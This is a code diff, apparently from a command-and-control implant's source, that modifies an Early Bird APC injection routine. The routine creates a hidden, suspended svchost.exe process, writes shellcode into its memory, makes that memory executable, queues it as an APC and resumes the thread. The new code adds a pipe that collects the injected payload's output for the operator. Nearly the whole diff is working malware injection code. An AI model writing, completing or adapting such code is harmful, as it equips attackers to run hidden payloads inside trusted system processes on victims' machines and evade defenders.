@@ -9,20 +9,39 @@
 /*
     Helper Functions
 */
+BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread, HANDLE* hTmpOutRead)
+{
+	SECURITY_ATTRIBUTES saAttr = { 0 };
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;  // Allow inheritance
+	saAttr.lpSecurityDescriptor = NULL;
 
-BOOL CreateSuspendedProcess2(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
+	HANDLE hStdOutRead;
+	HANDLE hStdOutWrite;
 
-	STARTUPINFO            Si    = { 0 };
-	PROCESS_INFORMATION    Pi    = { 0 };
+	// Create an anonymous pipe
+	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
+		printf("CreatePipe failed.\n");
+		return 1;
+	}
+
+	// Prevent child from inheriting the read handle
+	SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
+
+	STARTUPINFO            Si = { 0 };
+	PROCESS_INFORMATION    Pi = { 0 };
 
 	// Cleaning the structs by setting the element values to 0
 	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
 	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
 
-	// Setting the size of the structure
+	// Set up STARTUPINFO for output redirection
 	Si.cb = sizeof(STARTUPINFO);
+	Si.hStdOutput = hStdOutWrite;
+	Si.hStdError = hStdOutWrite;
+	Si.dwFlags |= STARTF_USESTDHANDLES;
 
-	_dbg("\t[i] Running Debug Process: \"%s\" ... ", lpPath);
+	printf("\t[i] Running Suspended Process: \"%s\" ... \n", lpPath);
 
 	// Creating the process
 	if (!CreateProcessA(
@@ -30,22 +49,26 @@ BOOL CreateSuspendedProcess2(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess
 		lpPath,
 		NULL,
 		NULL,
-		FALSE,
-		CREATE_SUSPENDED,
+		TRUE,									// bInheritHandles
+		CREATE_SUSPENDED | CREATE_NO_WINDOW,
 		NULL,
 		NULL,
 		&Si,
 		&Pi)) {
-		_dbg("[!] CreateProcessA Failed with Error : %d ", GetLastError());
+		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	_dbg("[+] DONE");
+	printf("[+] DONE\n");
+
+	// Close the write handle in the parent (no longer needed)
+	CloseHandle(hStdOutWrite);
 
 	// Filling up the OUTPUT parameter with CreateProcessA's output
-	*dwProcessId        = Pi.dwProcessId;
-	*hProcess           = Pi.hProcess;
-	*hThread            = Pi.hThread;
+	*dwProcessId = Pi.dwProcessId;
+	*hProcess = Pi.hProcess;
+	*hThread = Pi.hThread;
+	*hTmpOutRead = hStdOutRead;		// Anon pipe
 
 	// Doing a check to verify we got everything we need
 	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
@@ -62,25 +85,25 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 
 	pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pAddress == NULL) {
-		_dbg("\t[!] VirtualAllocEx Failed With Error : %d", GetLastError());
+		printf("\t[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
 		return FALSE;
 	}
-	_dbg("\t[+] Allocated memory region at : %p", pAddress);
+	printf("\t[+] Allocated memory region at : %p\n", pAddress);
 
 	SIZE_T szNumberOfBytesWritten = NULL;
 	if (!WriteProcessMemory(hProc, pAddress, pPayload, szPayloadSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szPayloadSize) {
-		_dbg("\t[!] Failed to write process memory : %d", GetLastError());
+		printf("\t[!] Failed to write process memory : %d\n", GetLastError());
 		return FALSE;
 	}
-	_dbg("\t[+] Copied %d bytes to allocated region.", szNumberOfBytesWritten);
+	printf("\t[+] Copied %d bytes to allocated region.\n", szNumberOfBytesWritten);
 
 	if (!VirtualProtectEx(hProc, pAddress, szPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
-		_dbg("\t[!] VirtualProtect Failed With Error : %d", GetLastError());
+		printf("\t[!] VirtualProtect Failed With Error : %d\n", GetLastError());
 		return FALSE;
 	}
 
 	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
-		_dbg("\t[!] QueueUserAPC Failed With Error : %d ", GetLastError());
+		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -89,37 +112,79 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 
 
 /*
-    Injection Functions
+	Injection Functions
 */
-
-BOOL InjectProcessViaEarlyBird(PBYTE buf, SIZE_T szShellcodeLen)
+BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_ PCHAR* outData)
 {
-    /*
-        TODO - move settings to the global instance xenonConfig
-    */
+	/*
+		TODO - move settings to the global instance xenonConfig
+	*/
 
-    LPCSTR sProcName = "C:\\Windows\\System32\\svchost.exe";		// Full path to process
+	LPCSTR sProcName = "C:\\Windows\\System32\\svchost.exe";		// Full path to process
 	DWORD dwProcId = NULL;
 	HANDLE hProcess = NULL;
 	HANDLE hThread = NULL;
+	HANDLE hStdOutRead = NULL;		// Read stdout through anon pipe
 
-	_dbg("[i] Creating \"%s\" as a debugged process. ", sProcName);
-	if (!CreateSuspendedProcess2(sProcName, &dwProcId, &hProcess, &hThread)) {
-		_dbg("Failed to create debugged process : %d", GetLastError());
+	printf("[i] Creating \"%s\" as a suspended process. \n", sProcName);
+	if (!CreateTemporaryProcess(sProcName, &dwProcId, &hProcess, &hThread, &hStdOutRead)) {
+		printf("Failed to create debugged process : %d\n", GetLastError());
 		return 1;
 	}
-    
-	_dbg("[i] Writing shellcode to target process");
+
+	printf("[i] Writing shellcode to target process\n");
 	if (!RunViaRemoteApcInjection(hThread, hProcess, buf, szShellcodeLen)) {
-		_dbg("Failed to RunViaRemoteApcInjection : %d", GetLastError());
+		printf("Failed to RunViaRemoteApcInjection : %d\n", GetLastError());
 		return 1;
 	}
 
-    ResumeThread(hThread);
+	ResumeThread(hThread);
 
-	// WaitForSingleObject(hThread, INFINITE);
+	//WaitForSingleObject(hThread, INFINITE);			// Currently waiting for entire thread to finish
 
-	_dbg("[#] DONE");
+	/* Read the output of the process */
+	DWORD bytesRead;
+	DWORD totalSize = 0;
+	DWORD chunkSize = 1024;		// Read in 1KB chunks
+	char* outputBuffer = (char*)malloc(chunkSize);
+	if (!outputBuffer) {
+		printf("Memory allocation failed.\n");
+		return 1;
+	}
+
+	while (TRUE) {
+		DWORD chunk = 1024;
+		char tempBuffer[1024];
+
+		BOOL success = ReadFile(hStdOutRead, tempBuffer, chunk - 1, &bytesRead, NULL);
+		if (!success || bytesRead == 0) {
+			break;  // No more data
+		}
+
+		tempBuffer[bytesRead] = '\0';  // Null-terminate
+
+		// Resize buffer if needed
+		if (totalSize + bytesRead >= chunkSize) {
+			chunkSize *= 2;  // Double the buffer size
+			outputBuffer = (char*)realloc(outputBuffer, chunkSize);
+			if (!outputBuffer) {
+				printf("Memory allocation failed.\n");
+				return 1;
+			}
+		}
+
+		// Append new data
+		memcpy(outputBuffer + totalSize, tempBuffer, bytesRead);
+		totalSize += bytesRead;
+	}
+	// Null-terminate and print the full output
+	outputBuffer[totalSize] = '\0';
+	
+	// Output data
+	*outData = outputBuffer;
+
+	CloseHandle(hStdOutRead);
+
+	printf("[#] DONE\n");
 	return TRUE;
-
 }
